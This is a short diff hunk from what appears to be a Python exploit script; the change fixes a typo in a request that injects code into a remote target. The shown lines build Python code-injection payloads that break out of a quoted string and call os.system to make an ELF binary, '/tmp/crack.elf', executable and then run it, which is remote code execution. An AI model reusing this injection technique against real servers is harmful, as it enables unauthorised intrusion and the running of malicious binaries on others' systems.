@@ -25,7 +25,7 @@ def main():
     os.system("rm -r crack.elf")
     
     cmd = "chmod +x /tmp/crack.elf"
-    get(targe + "';path='/';os.system("+"'"+cmd+"'"+");"+"'")
+    get(target + "';path='/';os.system("+"'"+cmd+"'"+");"+"'")
     cmd = "/tmp/crack.elf"
     get(target + "';path='/';os.system("+"'"+cmd2+"'"+");"+"'")
     
